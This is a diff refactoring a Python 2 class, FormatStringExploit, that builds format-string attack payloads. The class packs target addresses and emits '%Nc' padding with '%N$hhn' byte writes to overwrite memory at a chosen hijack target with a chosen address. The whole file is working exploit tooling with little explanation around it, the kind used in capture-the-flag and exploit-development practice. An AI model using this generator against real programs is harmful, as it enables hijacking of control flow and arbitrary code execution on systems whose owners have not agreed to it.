@@ -1,5 +1,4 @@
 import struct
-import math
 
 p32 = lambda x : struct.pack('<L', x)
 p64 = lambda x : struct.pack('<Q', x)
@@ -7,44 +6,51 @@ get_byte = lambda x : (x[0], x[1] & 0xff)
 
 class FormatStringExploit:
     printed = 0
-    def __init__(self, offset=0, printed=0, hijack_target=None, hijack_address=None):
-        self.offset = offset
+    table = {
+            32 : [p32, 4],
+            64 : [p64, 6]
+            }
+
+    def __init__(self, printed=0, hijack_target=None, hijack_address=None):
         self.hijack_target = hijack_target
         self.hijack_address = hijack_address
         FormatStringExploit.printed += printed
-        self.table = {
-                32 : [p32, 4],
-                64 : [p64, 6]
-                }
-
+        
     def address_setup(self, size=4):
         '''Arrange size of addres per byte for optimization'''
         adr = [(self.hijack_target + i, self.hijack_address >> 8 * i) for i in xrange(size)]
-        adr = sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)
-        return adr
+        return sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)
+
+    @staticmethod
+    def sort_multi_address(adr):
+        '''This is for hijack multiple target once'''
+        return sorted(adr, key=lambda x : x[1])
         
-    def generate_target(self, adr, bits):
-        payload = ''.join(self.table[bits][0](i[0]) for i in adr)
-        FormatStringExploit.printed += self.table[bits][1] * (bits / 8)
+    @classmethod
+    def generate_target(cls, adr, bits):
+        payload = ''.join(cls.table[bits][0](i[0]) for i in adr)
+        cls.printed += cls.table[bits][1] * len(adr)
         return payload
 
-    def generate_fmt(self, adr):
+    @classmethod
+    def generate_fmt(cls, adr, offset):
+        adr = map(lambda x : x[1], adr)
         payload = ''
         for idx, byte in enumerate(adr):
-            pad = ((byte - FormatStringExploit.printed) % 256 + 256) % 256
+            pad = ((byte - cls.printed) % 256 + 256) % 256
             if pad > 0:
                 payload += "%{}c".format(pad)
-            payload += "%{}$hhn".format(self.offset + idx)
-            FormatStringExploit.printed += pad
+            payload += "%{}$hhn".format(offset + idx)
+            cls.printed += pad
         return payload
 
-    def generate32(self):
+    def generate32(self, off):
         adr = self.address_setup()
         payload = self.generate_target(adr, 32)
-        adr = map(lambda x : x[1], adr)
-        payload += self.generate_fmt(adr)
+        payload += self.generate_fmt(adr, off)
         return payload
 
-    def size(self):
+    @classmethod
+    def size(cls):
         '''Return already printed words'''
-        return FormatStringExploit.printed
+        return cls.printed
